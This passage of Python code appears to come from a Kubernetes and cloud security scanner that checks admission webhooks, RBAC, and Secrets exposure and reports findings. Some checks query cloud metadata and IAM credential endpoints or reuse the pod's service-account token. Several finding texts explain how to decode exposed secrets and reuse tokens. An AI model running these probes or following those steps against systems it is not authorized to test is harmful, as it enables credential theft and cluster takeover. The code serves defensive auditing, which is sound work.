      2. MutatingWebhookConfiguration list empty    -- HIGH NO_MUTATING_WEBHOOKS
      3. Any webhook with failurePolicy=Ignore      -- MEDIUM WEBHOOK_FAILURE_IGNORE
      4. PodDisruptionBudget list empty             -- MEDIUM NO_POD_DISRUPTION_BUDGETS

    Returns list of {severity, title, detail, host, port}.
    """
    findings: list = []
    ignore_webhooks: list[str] = []

    # --- 1. ValidatingWebhookConfigurations ---
    vwh_data = _k8s_get(
        host, port,
        '/apis/admissionregistration.k8s.io/v1/validatingwebhookconfigurations',
        timeout,
    )
    if vwh_data is not None:
        vwh_items = vwh_data.get('items', [])
        if not vwh_items:
            findings.append({
                'severity': 'HIGH',
                'title': 'NO_VALIDATING_WEBHOOKS',
                'detail': (
                    f'No ValidatingWebhookConfiguration objects found on {host}:{port}. '
                    'Without admission validation, Kubernetes accepts any resource '
                    'regardless of security policy violations -- privileged pods, '
                    'hostPath mounts, unrestricted capabilities, or images from '
                    'untrusted registries are all admitted silently. '
                    'CIS Benchmark requires at least one validating admission controller '
                    'enforcing pod security standards.'
                ),
                'host': host,
                'port': port,
            })
        else:
            for cfg in vwh_items:
                cfg_name = cfg.get('metadata', {}).get('name', '<unknown>')
                for wh in cfg.get('webhooks', []):
                    if wh.get('failurePolicy', '') == 'Ignore':
                        ignore_webhooks.append(
                            f"{cfg_name}/{wh.get('name', '<unnamed>')}"
                        )

    # --- 2. MutatingWebhookConfigurations ---
    mwh_data = _k8s_get(
        host, port,
        '/apis/admissionregistration.k8s.io/v1/mutatingwebhookconfigurations',
        timeout,
    )
    if mwh_data is not None:
        mwh_items = mwh_data.get('items', [])
        if not mwh_items:
            findings.append({
                'severity': 'HIGH',
                'title': 'NO_MUTATING_WEBHOOKS',
                'detail': (
                    f'No MutatingWebhookConfiguration objects found on {host}:{port}. '
                    'Without mutation admission, Kubernetes cannot automatically enforce '
                    'default security controls such as imagePullPolicy=Always, '
                    'readOnlyRootFilesystem, or required security labels. '
                    'Operators relying on mutation for baseline security posture '
                    '(e.g., Gatekeeper mutation, Istio sidecar injection) are inactive.'
                ),
                'host': host,
                'port': port,
            })
        else:
            for cfg in mwh_items:
                cfg_name = cfg.get('metadata', {}).get('name', '<unknown>')
                for wh in cfg.get('webhooks', []):
                    if wh.get('failurePolicy', '') == 'Ignore':
                        ignore_webhooks.append(
                            f"{cfg_name}/{wh.get('name', '<unnamed>')}"
                        )

    # --- 3. Report any fail-open (failurePolicy=Ignore) webhooks ---
    if ignore_webhooks:
        findings.append({
            'severity': 'MEDIUM',
            'title': 'WEBHOOK_FAILURE_IGNORE',
            'detail': (
                f'{len(ignore_webhooks)} admission webhook(s) on {host}:{port} '
                'use failurePolicy=Ignore (fail-open). '
                'If the webhook service is unavailable or its timeout expires, '
                'the Kubernetes API server admits the resource without policy '
                'evaluation. Exploitable by disrupting the webhook endpoint '
                '(network isolation, resource exhaustion, or restarting the '
                'webhook pod) before submitting a non-compliant resource. '
                'Affected: ' + ', '.join(ignore_webhooks[:10])
                + (' ...' if len(ignore_webhooks) > 10 else '')
            ),
            'host': host,
            'port': port,
        })

    # --- 4. PodDisruptionBudgets ---
    pdb_data = _k8s_get(
        host, port,
        '/apis/policy/v1/poddisruptionbudgets',
        timeout,
    )
    if pdb_data is not None and not pdb_data.get('items'):
        findings.append({
            'severity': 'MEDIUM',
            'title': 'NO_POD_DISRUPTION_BUDGETS',
            'detail': (
                f'No PodDisruptionBudget resources found on {host}:{port}. '
                'Without PDBs, voluntary disruptions (node drains, rolling updates, '
                'cluster upgrades) can evict all replicas of a deployment '
                'simultaneously, causing complete service unavailability. '
                'Absence also signals immature governance: PDB creation is a '
                'prerequisite for safe cluster maintenance at scale.'
            ),
            'host': host,
            'port': port,
        })

    return findings


def check_imds_access_from_pod(
    host: str = "169.254.169.254",
    port: int = 80,
    timeout: float = 5.0,
) -> list:
    """Probe cloud provider IMDS endpoints from inside a Kubernetes pod.

    Detects unauthenticated access to AWS IMDSv1, GCP, and Azure instance
    metadata services — a common SSRF-to-credential-theft vector when pods
    are scheduled on cloud-provider nodes without strict network policies or
    IMDSv2 enforcement.

    Args:
        host: IMDS address (default 169.254.169.254 covers AWS/Azure).
        port: TCP port (default 80).
        timeout: Per-request timeout in seconds.

    Returns:
        List of finding dicts with severity, title, detail, host, port.
    """
    import urllib.request
    import urllib.error

    findings: list = []

    def _imds_get(url: str, headers: dict | None = None) -> tuple[int, str]:
        """Return (status_code, body_excerpt) or (-1, '') on error."""
        req = urllib.request.Request(url, headers=headers or {})
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                body = resp.read(512).decode("utf-8", errors="replace")
                return resp.status, body
        except urllib.error.HTTPError as exc:
            return exc.code, ""
        except Exception:
            return -1, ""

    # --- AWS IMDSv1 root ---
    aws_url = f"http://{host}/latest/meta-data/"
    status, body = _imds_get(aws_url)
    if status == 200 and body:
        findings.append({
            "severity": "CRITICAL",
            "title": "AWS_IMDS_V1_UNAUTH",
            "detail": (
                f"AWS EC2 instance metadata accessible without IMDSv2 token "
                f"at {aws_url} (HTTP {status}). IMDSv1 requires no session "
                f"token — any process or SSRF payload in this pod can read "
                f"IAM credentials, user-data secrets, and instance identity "
                f"without authentication. CVE class: SSRF to credential theft. "
                f"Remediate by enforcing IMDSv2 (HttpTokens=required) on the "
                f"node's instance metadata options."
            ),
            "host": host,
            "port": port,
        })

        # --- AWS IAM role name disclosure ---
        iam_url = f"http://{host}/latest/meta-data/iam/security-credentials/"
        iam_status, iam_body = _imds_get(iam_url)
        if iam_status == 200 and iam_body.strip():
            findings.append({
                "severity": "CRITICAL",
                "title": "AWS_IMDS_IAM_ROLE",
                "detail": (
                    f"IAM role name disclosed via IMDS at {iam_url} "
                    f"(HTTP {iam_status}). Role: {iam_body.strip()[:128]}. "
                    f"A second request to "
                    f"http://{host}/latest/meta-data/iam/security-credentials/"
                    f"<role-name> retrieves temporary AWS credentials "
                    f"(AccessKeyId, SecretAccessKey, Token) with the full "
                    f"permission set of the attached instance profile."
                ),
                "host": host,
                "port": port,
            })

    # --- GCP IMDS ---
    gcp_url = "http://metadata.google.internal/computeMetadata/v1/"
    gcp_status, gcp_body = _imds_get(
        gcp_url,
        headers={"Metadata-Flavor": "Google"},
    )
    if gcp_status == 200 and gcp_body:
        findings.append({
            "severity": "CRITICAL",
            "title": "GCP_IMDS_UNAUTH",
            "detail": (
                f"GCP instance metadata accessible at {gcp_url} "
                f"(HTTP {gcp_status}). The Metadata-Flavor: Google header "
                f"is the sole gate — any workload in this pod can read "
                f"service account OAuth tokens, project metadata, and SSH "
                f"keys. Remediate by applying a NetworkPolicy egress rule "
                f"blocking 169.254.169.254 and metadata.google.internal, "
                f"and/or Workload Identity to eliminate node-level SA binding."
            ),
            "host": "metadata.google.internal",
            "port": port,
        })

    # --- Azure IMDS ---
    azure_url = (
        f"http://{host}/metadata/instance?api-version=2021-02-01"
    )
    azure_status, azure_body = _imds_get(
        azure_url,
        headers={"Metadata": "true"},
    )
    if azure_status == 200 and azure_body:
        findings.append({
            "severity": "CRITICAL",
            "title": "AZURE_IMDS_UNAUTH",
            "detail": (
                f"Azure instance metadata accessible at {azure_url} "
                f"(HTTP {azure_status}). The Metadata: true header is the "
                f"sole gate — any workload can read subscription ID, resource "
                f"group, managed identity tokens, and VM identity. Remediate "
                f"by blocking outbound access to 169.254.169.254 via "
                f"NetworkPolicy and rotating any credentials that may have "
                f"been exposed."
            ),
            "host": host,
            "port": port,
        })

    return findings


def check_k8s_service_account_token_abuse(
    host: str = "kubernetes.default.svc",
    port: int = 443,
    timeout: float = 10.0,
) -> list:
    """Check for service account token exposure and API server accessibility.

    Reads the default service account token mount and probes the Kubernetes
    API server with it to detect over-permissioned RBAC bindings, which are
    among the most common privilege-escalation vectors in Kubernetes clusters.

    Args:
        host: Kubernetes API server hostname.
        port: API server port (default 443).
        timeout: Per-request timeout in seconds.

    Returns:
        List of finding dicts with severity, title, detail, host, port.
    """
    import os
    import ssl
    import urllib.request
    import urllib.error

    findings: list = []

    SA_DIR = "/var/run/secrets/kubernetes.io/serviceaccount"
    token_path = os.path.join(SA_DIR, "token")
    ns_path = os.path.join(SA_DIR, "namespace")
    ca_path = os.path.join(SA_DIR, "ca.crt")

    sa_token: str | None = None

    # --- Token mount check ---
    if os.path.isfile(token_path):
        try:
            with open(token_path, "r") as fh:
                sa_token = fh.read().strip()
            findings.append({
                "severity": "HIGH",
                "title": "SA_TOKEN_MOUNTED",
                "detail": (
                    f"Service account token accessible at {token_path}. "
                    f"Automounting the default SA token is enabled for this "
                    f"pod. Any process running in the container (including "
                    f"compromised application code) can read this token and "
                    f"use it to authenticate against the Kubernetes API. "
                    f"Remediate by setting automountServiceAccountToken: false "
                    f"in the pod spec when API access is not required."
                ),
                "host": host,
                "port": port,
            })
        except OSError:
            sa_token = None

    # --- Namespace disclosure ---
    if os.path.isfile(ns_path):
        try:
            with open(ns_path, "r") as fh:
                ns_value = fh.read().strip()
            findings.append({
                "severity": "INFO",
                "title": "SA_NAMESPACE_DISCLOSED",
                "detail": (
                    f"Pod namespace readable from service account mount: "
                    f"'{ns_value}' (path: {ns_path}). This is expected "
                    f"Kubernetes behavior but confirms the pod is running "
                    f"inside the cluster and the SA mount is active. "
                    f"Namespace knowledge aids lateral movement scoping."
                ),
                "host": host,
                "port": port,
            })
        except OSError:
            pass

    if not sa_token:
        return findings

    # Build SSL context — trust the cluster CA if present, else skip verify.
    ssl_ctx = ssl.create_default_context()
    if os.path.isfile(ca_path):
        ssl_ctx.load_verify_locations(ca_path)
    else:
        ssl_ctx.check_hostname = False
        ssl_ctx.verify_mode = ssl.CERT_NONE

    def _k8s_api_get(path: str) -> tuple[int, str]:
        """Return (status_code, body_excerpt) for a Kubernetes API call."""
        url = f"https://{host}:{port}{path}"
        req = urllib.request.Request(
            url,
            headers={"Authorization": f"Bearer {sa_token}"},
        )
        try:
            with urllib.request.urlopen(req, context=ssl_ctx, timeout=timeout) as resp:
                body = resp.read(1024).decode("utf-8", errors="replace")
                return resp.status, body
        except urllib.error.HTTPError as exc:
            return exc.code, ""
        except Exception:
            return -1, ""

    # --- API server reachable with SA token ---
    api_status, api_body = _k8s_api_get("/api")
    if api_status == 200 and api_body:
        findings.append({
            "severity": "CRITICAL",
            "title": "K8S_API_SA_AUTH",
            "detail": (
                f"Kubernetes API server at https://{host}:{port}/api responded "
                f"HTTP {api_status} with the mounted service account token. "
                f"The token is valid and accepted by the API server. "
                f"Combined with SA_TOKEN_MOUNTED, any code execution in this "
                f"pod translates directly to authenticated Kubernetes API "
                f"access. Minimum remediation: "
                f"automountServiceAccountToken: false; audit RBAC bindings "
                f"for this SA."
            ),
            "host": host,
            "port": port,
        })

    # --- Cluster-wide namespace list (excessive RBAC) ---
    ns_list_status, ns_list_body = _k8s_api_get("/api/v1/namespaces")
    if ns_list_status == 200 and ns_list_body:
        findings.append({
            "severity": "CRITICAL",
            "title": "K8S_SA_CLUSTER_LIST",
            "detail": (
                f"Service account can list all namespaces cluster-wide "
                f"(GET /api/v1/namespaces -> HTTP {ns_list_status}). "
                f"This indicates a ClusterRole binding with "
                f"namespaces/list or wildcard resource privileges — "
                f"a common misconfiguration introduced by Helm charts and "
                f"operators that request over-broad RBAC. An attacker with "
                f"code execution in this pod can enumerate every namespace, "
                f"pivot to other workloads, and escalate further if the SA "
                f"also has get/create/delete on pods or secrets. "
                f"Remediate: replace ClusterRoleBinding with a "
                f"namespace-scoped RoleBinding granting only required verbs."
            ),
            "host": host,
            "port": port,
        })

    return findings


def check_k8s_rbac_exposure(
    host: str,
    port: int = 6443,
    timeout: float = 10.0,
) -> list:
    """Detect Kubernetes RBAC misconfigurations via unauthenticated API probes.

    Synthesized from Kubernetes Best Practices 2e ch4 (Configuration, Secrets,
    and RBAC): RBAC is the primary authorization mechanism in Kubernetes.
    Wildcard permissions, cluster-admin over-grants, and unauthenticated
    enumeration of ClusterRoleBindings are among the most severe misconfigurations
    an attacker can exploit for lateral movement and privilege escalation.

    Checks:
      1. GET /apis/rbac.authorization.k8s.io/v1/clusterrolebindings without auth
      2. Parse bindings for wildcard subjects (system:anonymous, '*')
      3. Parse bindings for cluster-admin bound to non-system accounts
      4. GET /apis/rbac.authorization.k8s.io/v1/clusterroles for wildcard verbs/resources
      5. GET /api/v1/serviceaccounts for unauthenticated enumeration

    Args:
        host: Kubernetes API server hostname or IP.
        port: API server port (default 6443).
        timeout: Per-request timeout in seconds.

    Returns:
        List of finding dicts with severity, title, detail, host, port.
    """
    import ssl
    import json
    import urllib.request
    import urllib.error

    findings: list = []

    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    def _get(path: str):
        for scheme in ("https", "http"):
            url = f"{scheme}://{host}:{port}{path}"
            try:
                req = urllib.request.Request(url)
                req.add_header("Accept", "application/json")
                with urllib.request.urlopen(req, context=ctx, timeout=timeout) as resp:
                    if resp.status == 200:
                        return json.loads(resp.read().decode(errors="replace"))
            except Exception:
                continue
        return None

    # --- 1. Unauthenticated ClusterRoleBindings enumeration ---
    crbs_path = "/apis/rbac.authorization.k8s.io/v1/clusterrolebindings"
    crbs = _get(crbs_path)
    if crbs is not None:
        findings.append({
            "severity": "CRITICAL",
            "title": "K8S_CLUSTERROLEBINDINGS_UNAUTH",
            "detail": (
                f"Unauthenticated GET {crbs_path} returned HTTP 200. "
                f"The RBAC API is readable without credentials, allowing any "
                f"network-adjacent attacker to fully enumerate cluster role "
                f"assignments, identify over-privileged accounts, and map "
                f"privilege-escalation paths. "
                f"Remediate: enable anonymous-auth=false on the API server and "
                f"ensure RBAC authorization mode is active with no ABAC fallback."
            ),
            "host": host,
            "port": port,
        })

        # --- 2. Parse bindings for wildcard subjects ---
        items = crbs.get("items") or []
        for binding in items:
            role_ref = binding.get("roleRef", {})
            subjects = binding.get("subjects") or []
            binding_name = binding.get("metadata", {}).get("name", "<unknown>")
            for subj in subjects:
                name = subj.get("name", "")
                kind = subj.get("kind", "")
                if name in ("*", "system:anonymous", "system:unauthenticated") or name == "":
                    findings.append({
                        "severity": "CRITICAL",
                        "title": "K8S_WILDCARD_RBAC_BINDING",
                        "detail": (
                            f"ClusterRoleBinding '{binding_name}' binds role "
                            f"'{role_ref.get('name', '?')}' to subject "
                            f"kind={kind} name='{name}'. "
                            f"Wildcard or anonymous subjects grant the bound "
                            f"permissions to every unauthenticated request, "
                            f"enabling trivial privilege escalation. "
                            f"Remediate: remove wildcard/anonymous subjects and "
                            f"replace with explicit, least-privilege principals."
                        ),
                        "host": host,
                        "port": port,
                    })

            # --- 3. cluster-admin bound to non-system accounts ---
            if role_ref.get("name") == "cluster-admin":
                for subj in subjects:
                    name = subj.get("name", "")
                    kind = subj.get("kind", "")
                    if not name.startswith("system:"):
                        findings.append({
                            "severity": "CRITICAL",
                            "title": "K8S_CLUSTER_ADMIN_OVER_GRANT",
                            "detail": (
                                f"ClusterRoleBinding '{binding_name}' grants "
                                f"cluster-admin to non-system account: "
                                f"kind={kind} name='{name}'. "
                                f"cluster-admin is a superuser role with full "
                                f"access to every resource and verb. Granting it "
                                f"to user accounts, service accounts, or external "
                                f"identities violates least-privilege and is a "
                                f"direct privilege-escalation path. "
                                f"Remediate: revoke cluster-admin; grant only the "
                                f"minimum namespaced Role/RoleBinding required."
                            ),
                            "host": host,
                            "port": port,
                        })

    # --- 4. Wildcard verbs/resources in ClusterRoles ---
    crs_path = "/apis/rbac.authorization.k8s.io/v1/clusterroles"
    crs = _get(crs_path)
    if crs is not None:
        for role in (crs.get("items") or []):
            role_name = role.get("metadata", {}).get("name", "<unknown>")
            if role_name.startswith("system:"):
                continue
            for rule in (role.get("rules") or []):
                verbs = rule.get("verbs", [])
                resources = rule.get("resources", [])
                if "*" in verbs and "*" in resources:
                    findings.append({
                        "severity": "HIGH",
                        "title": "K8S_WILDCARD_PERMISSIONS",
                        "detail": (
                            f"ClusterRole '{role_name}' contains a rule with "
                            f"verbs=['*'] and resources=['*'], granting unrestricted "
                            f"access to all API resources. This is equivalent to "
                            f"cluster-admin for any bound subject and violates the "
                            f"principle of least privilege. "
                            f"Remediate: replace wildcards with the explicit verb "
                            f"and resource lists required by the workload."
                        ),
                        "host": host,
                        "port": port,
                    })
                    break  # one finding per role

    # --- 5. Unauthenticated ServiceAccount enumeration ---
    sa_path = "/api/v1/serviceaccounts"
    sa_data = _get(sa_path)
    if sa_data is not None:
        findings.append({
            "severity": "HIGH",
            "title": "K8S_SERVICEACCOUNTS_ENUMERABLE",
            "detail": (
                f"Unauthenticated GET {sa_path} returned HTTP 200. "
                f"An attacker can enumerate all service accounts across "
                f"all namespaces, identify high-privilege SAs, and target "
                f"pods running those SAs for token extraction. "
                f"Combined with ClusterRoleBinding enumeration this provides "
                f"a complete privilege map of the cluster. "
                f"Remediate: require authentication on all API server paths "
                f"and set --anonymous-auth=false."
            ),
            "host": host,
            "port": port,
        })

    return findings


def check_k8s_admission_webhook_posture(
    host: str,
    port: int = 6443,
    timeout: float = 10.0,
) -> list:
    """Detect missing or misconfigured Kubernetes admission controller configuration.

    Synthesized from Kubernetes Best Practices 2e ch17 (Admission Control and
    Authorization): admission webhooks enforce policy and security posture at
    the API server request boundary. Missing policy webhooks (OPA/Gatekeeper,
    Kyverno, Pod Security), webhooks with failurePolicy: Ignore, and absent
    PodSecurityPolicy on legacy clusters each represent distinct bypass surfaces.
    The book identifies failurePolicy: Ignore as the most common admission
    controller misconfiguration — a degraded or unreachable webhook silently
    passes all requests, defeating any policy the webhook was meant to enforce.

    Checks:
      1. GET /apis/admissionregistration.k8s.io/v1/validatingwebhookconfigurations
         - Empty list -> CRITICAL K8S_NO_ADMISSION_WEBHOOKS
         - No policy engine webhook (Gatekeeper/Kyverno/PodSecurity) -> HIGH
      2. GET /apis/admissionregistration.k8s.io/v1/mutatingwebhookconfigurations
         - Any webhook with failurePolicy: Ignore -> HIGH
      3. GET /api/v1/namespaces/kube-system/pods
         - Presence of kube-bench / audit scanner -> INFO
      4. GET /apis/policy/v1beta1/podsecuritypolicies (deprecated; legacy check)
         - 404/absent on older cluster -> MEDIUM K8S_NO_PSP

    Args:
        host: Kubernetes API server hostname or IP.
        port: API server port (default 6443).
        timeout: Per-request timeout in seconds.

    Returns:
        List of finding dicts with severity, title, detail, host, port.
    """
    import ssl
    import json
    import urllib.request
    import urllib.error

    findings: list = []

    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    def _get(path: str):
        for scheme in ("https", "http"):
            url = f"{scheme}://{host}:{port}{path}"
            try:
                req = urllib.request.Request(url)
                req.add_header("Accept", "application/json")
                with urllib.request.urlopen(req, context=ctx, timeout=timeout) as resp:
                    if resp.status == 200:
                        return json.loads(resp.read().decode(errors="replace"))
            except Exception:
                continue
        return None

    def _get_status(path: str) -> int:
        """Return HTTP status code for first successful scheme, or -1."""
        for scheme in ("https", "http"):
            url = f"{scheme}://{host}:{port}{path}"
            try:
                req = urllib.request.Request(url)
                req.add_header("Accept", "application/json")
                with urllib.request.urlopen(req, context=ctx, timeout=timeout) as resp:
                    return resp.status
            except urllib.error.HTTPError as e:
                return e.code
            except Exception:
                continue
        return -1

    # --- 1. ValidatingWebhookConfigurations ---
    vwc_path = "/apis/admissionregistration.k8s.io/v1/validatingwebhookconfigurations"
    vwc_data = _get(vwc_path)

    if vwc_data is not None:
        items = vwc_data.get("items") or []
        if len(items) == 0:
            findings.append({
                "severity": "CRITICAL",
                "title": "K8S_NO_ADMISSION_WEBHOOKS",
                "detail": (
                    f"GET {vwc_path} returned an empty items list. "
                    f"No validating admission webhooks are configured on this "
                    f"cluster. Without admission webhooks, there is no server-side "
                    f"enforcement of security policy: privileged containers, "
                    f"host-network pods, missing resource limits, and forbidden "
                    f"image sources will all be admitted. "
                    f"Remediate: deploy a policy engine (OPA/Gatekeeper, Kyverno, "
                    f"or the built-in Pod Security Admission controller) and "
                    f"configure validating webhooks for core security controls."
                ),
                "host": host,
                "port": port,
            })
        else:
            # Check for policy engine webhooks
            policy_keywords = (
                "gatekeeper", "kyverno", "podsecurity", "pod-security",
                "opa", "policy", "constraints", "falco",
            )
            names = [
                (w.get("metadata", {}).get("name") or "").lower()
                for item in items
                for w in [item]
            ]
            has_policy_wh = any(
                any(kw in n for kw in policy_keywords) for n in names
            )
            if not has_policy_wh:
                findings.append({
                    "severity": "HIGH",
                    "title": "K8S_NO_POLICY_ADMISSION_WEBHOOK",
                    "detail": (
                        f"Validating webhooks exist but none match policy-engine "
                        f"patterns (gatekeeper, kyverno, opa, podsecurity, "
                        f"falco, constraints). "
                        f"Found webhooks: {', '.join(names) or 'none'}. "
                        f"Without a policy engine webhook, per-namespace Pod "
                        f"Security labels and custom constraint logic are absent, "
                        f"leaving pod privilege escalation paths unguarded. "
                        f"Remediate: deploy OPA/Gatekeeper or Kyverno and define "
                        f"baseline/restricted Pod Security policies."
                    ),
                    "host": host,
                    "port": port,
                })

    # --- 2. MutatingWebhookConfigurations — failurePolicy: Ignore ---
    mwc_path = "/apis/admissionregistration.k8s.io/v1/mutatingwebhookconfigurations"
    mwc_data = _get(mwc_path)

    if mwc_data is not None:
        for config in (mwc_data.get("items") or []):
            config_name = config.get("metadata", {}).get("name", "<unknown>")
            for wh in (config.get("webhooks") or []):
                wh_name = wh.get("name", "<unknown>")
                if wh.get("failurePolicy") == "Ignore":
                    findings.append({
                        "severity": "HIGH",
                        "title": "K8S_ADMISSION_FAILURE_IGNORE",
                        "detail": (
                            f"MutatingWebhookConfiguration '{config_name}' "
                            f"webhook '{wh_name}' has failurePolicy: Ignore. "
                            f"If this webhook becomes unreachable or returns an "
                            f"error, the API server silently admits the request "
                            f"without mutation. For security-critical webhooks "
                            f"(sidecar injection, secret encryption, label "
                            f"enforcement) this means the policy is bypassed "
                            f"during any webhook outage — exactly when an attacker "
                            f"might trigger one. "
                            f"Remediate: set failurePolicy: Fail for security "
                            f"webhooks and implement HA webhook deployments with "
                            f"PodDisruptionBudget to prevent outage-based bypass."
                        ),
                        "host": host,
                        "port": port,
                    })

    # --- 3. Security scanning pods in kube-system ---
    pods_path = "/api/v1/namespaces/kube-system/pods"
    pods_data = _get(pods_path)

    if pods_data is not None:
        scanner_keywords = ("kube-bench", "kube-hunter", "audit", "trivy", "falco")
        scanner_pods = []
        for pod in (pods_data.get("items") or []):
            pod_name = (pod.get("metadata", {}).get("name") or "").lower()
            if any(kw in pod_name for kw in scanner_keywords):
                scanner_pods.append(pod_name)
        if scanner_pods:
            findings.append({
                "severity": "INFO",
                "title": "K8S_SECURITY_SCANNING_PRESENT",
                "detail": (
                    f"Security scanning/audit pods found in kube-system: "
                    f"{', '.join(scanner_pods)}. "
                    f"Cluster operator has deployed active security tooling. "
                    f"Assess whether scanner findings feed into a SIEM or "
                    f"alerting pipeline and whether scans run on a schedule "
                    f"or are one-off artifacts."
                ),
                "host": host,
                "port": port,
            })

    # --- 4. PodSecurityPolicy (deprecated; legacy clusters) ---
    psp_path = "/apis/policy/v1beta1/podsecuritypolicies"
    psp_status = _get_status(psp_path)
    if psp_status == 404:
        # API group absent — PSP either removed (1.25+) or never enabled
        # Only flag as MEDIUM on clusters where it was expected (pre-1.25 era)
        # Check server version to scope the finding
        api_data = _get("/api/v1")
        if api_data is not None:
            server_version = api_data.get("serverVersion", {})
            minor_str = str(server_version.get("minor", "99")).replace("+", "")
            try:
                minor = int(minor_str)
            except ValueError:
                minor = 99
            if minor < 25:
                findings.append({
                    "severity": "MEDIUM",
                    "title": "K8S_NO_PSP",
                    "detail": (
                        f"GET {psp_path} returned 404 on a cluster with "
                        f"server minor version {minor} (< 25). "
                        f"PodSecurityPolicy was the primary pod-level security "
                        f"control before Kubernetes 1.25. Its absence on a "
                        f"pre-1.25 cluster means no admission-time restrictions "
                        f"on privileged containers, host-path volumes, "
                        f"host-network, or runAsRoot. "
                        f"Remediate: enable PodSecurityPolicy admission plugin "
                        f"and define at minimum a restricted PSP, or migrate to "
                        f"Pod Security Admission if upgrading to 1.25+."
                    ),
                    "host": host,
                    "port": port,
                })

    return findings


def check_k8s_secret_exposure(
    host: str, port: int = 6443, timeout: float = 10.0
) -> list:
    """
    Probe K8s API server for unauthenticated access to Secrets.

    Synthesized from Hands-On Red Team Tactics: post-exploitation credential
    harvest and data exfiltration phases. Kubernetes Secrets hold credentials,
    tokens, TLS certificates, and cloud provider keys. Unauthenticated read
    access to the Secrets API is a critical misconfiguration enabling direct
    credential harvest without any lateral movement. Red team priority: this
    is the primary post-pivot target after establishing API server access —
    Secrets enumerate cloud keys (AWS, GCP, Azure), registry auth, and service
    account tokens that chain into full cluster takeover.

    Checks:
      1. GET /api/v1/secrets (cluster-wide, no auth)
         - Count Secrets in kube-system              -- CRITICAL K8S_SYSTEM_SECRETS_EXPOSED
         - type=kubernetes.io/service-account-token  -- CRITICAL K8S_SA_TOKEN_EXPOSED
         - type=Opaque with populated data fields     -- CRITICAL K8S_OPAQUE_SECRET_EXPOSED
         - names matching aws/gcp/azure/docker/registry patterns
                                                     -- CRITICAL K8S_CLOUD_CRED_SECRET
      2. GET /api/v1/namespaces/kube-system/secrets  -- CRITICAL K8S_KUBESYSTEM_SECRETS_UNAUTH
      3. GET /api/v1/namespaces/default/secrets      -- HIGH     K8S_DEFAULT_NS_SECRETS

    Returns list of {severity, title, detail, host, port}.
    """
    findings: list = []

    _CLOUD_CRED_PATTERNS = ('aws', 'gcp', 'azure', 'docker', 'registry')

    # --- 1. Cluster-wide secrets list (unauthenticated) ---
    data = _k8s_get(host, port, '/api/v1/secrets', timeout)
    if data and data.get('kind') == 'SecretList':
        items = data.get('items') or []
        findings.append({
            'severity': 'CRITICAL',
            'title': 'K8S_SECRETS_UNAUTH_LIST',
            'detail': (
                f'Unauthenticated GET /api/v1/secrets returned {len(items)} Secret(s) '
                f'across all namespaces on {host}:{port}. Kubernetes Secrets contain '
                'service account tokens, TLS certificates, Docker registry credentials, '
                'and cloud provider keys. Authentication must be enforced on the '
                'API server with --anonymous-auth=false.'
            ),
            'host': host,
            'port': port,
        })

        kubesystem_count = 0
        sa_token_count = 0
        opaque_count = 0
        cloud_cred_secrets: list = []

        for item in items:
            meta = item.get('metadata') or {}
            ns = meta.get('namespace', '')
            name = (meta.get('name') or '').lower()
            secret_type = item.get('type', '')
            secret_data = item.get('data') or {}

            if ns == 'kube-system':
                kubesystem_count += 1

            if secret_type == 'kubernetes.io/service-account-token':
                sa_token_count += 1

            if secret_type == 'Opaque' and secret_data:
                opaque_count += 1

            if any(pat in name for pat in _CLOUD_CRED_PATTERNS):
                cloud_cred_secrets.append(f'{ns}/{name}')

        if kubesystem_count:
            findings.append({
                'severity': 'CRITICAL',
                'title': 'K8S_SYSTEM_SECRETS_EXPOSED',
                'detail': (
                    f'{kubesystem_count} kube-system Secret(s) readable without '
                    f'authentication on {host}:{port}. kube-system Secrets include '
                    'bootstrap tokens, controller credentials, and cluster CA material. '
                    'Access enables full control-plane impersonation.'
                ),
                'host': host,
                'port': port,
            })

        if sa_token_count:
            findings.append({
                'severity': 'CRITICAL',
                'title': 'K8S_SA_TOKEN_EXPOSED',
                'detail': (
                    f'{sa_token_count} kubernetes.io/service-account-token Secret(s) '
                    f'readable without authentication on {host}:{port}. SA tokens '
                    'grant API server access as the bound service account. Enumerate '
                    'RBAC grants via SelfSubjectAccessReview to determine privilege '
                    'scope. Tokens are base64-encoded JWTs usable directly with '
                    'kubectl --token or the Authorization: Bearer header.'
                ),
                'host': host,
                'port': port,
            })

        if opaque_count:
            findings.append({
                'severity': 'CRITICAL',
                'title': 'K8S_OPAQUE_SECRET_EXPOSED',
                'detail': (
                    f'{opaque_count} Opaque Secret(s) with populated data fields '
                    f'readable without authentication on {host}:{port}. Opaque Secrets '
                    'hold arbitrary key-value pairs — database passwords, API tokens, '
                    'TLS private keys, and encryption keys. Decode values with '
                    'base64 -d to recover plaintext credentials.'
                ),
                'host': host,
                'port': port,
            })

        if cloud_cred_secrets:
            findings.append({
                'severity': 'CRITICAL',
                'title': 'K8S_CLOUD_CRED_SECRET',
                'detail': (
                    f'High-value cloud credential Secret(s) readable without '
                    f'authentication on {host}:{port}: '
                    f'{", ".join(cloud_cred_secrets[:10])}. '
                    'Names match aws/gcp/azure/docker/registry credential patterns. '
                    'Decode data fields to recover cloud access keys, enabling lateral '
                    'movement into cloud control plane — IAM privilege escalation, '
                    'storage exfiltration, compute access.'
                ),
                'host': host,
                'port': port,
            })

    # --- 2. kube-system namespace secrets (direct namespace-scoped probe) ---
    ks_data = _k8s_get(host, port, '/api/v1/namespaces/kube-system/secrets', timeout)
    if ks_data and ks_data.get('kind') == 'SecretList':
        ks_items = ks_data.get('items') or []
        findings.append({
            'severity': 'CRITICAL',
            'title': 'K8S_KUBESYSTEM_SECRETS_UNAUTH',
            'detail': (
                f'Unauthenticated GET /api/v1/namespaces/kube-system/secrets returned '
                f'{len(ks_items)} Secret(s) on {host}:{port}. Direct namespace-scoped '
                'access to kube-system Secrets bypasses cluster-level list restrictions '
                'and is sufficient for full cluster compromise without cluster-admin.'
            ),
            'host': host,
            'port': port,
        })

    # --- 3. default namespace secrets ---
    def_data = _k8s_get(host, port, '/api/v1/namespaces/default/secrets', timeout)
    if def_data and def_data.get('kind') == 'SecretList':
        def_items = def_data.get('items') or []
        findings.append({
            'severity': 'HIGH',
            'title': 'K8S_DEFAULT_NS_SECRETS',
            'detail': (
                f'Unauthenticated GET /api/v1/namespaces/default/secrets returned '
                f'{len(def_items)} Secret(s) on {host}:{port}. Default namespace '
                'Secrets commonly hold application credentials and service tokens '
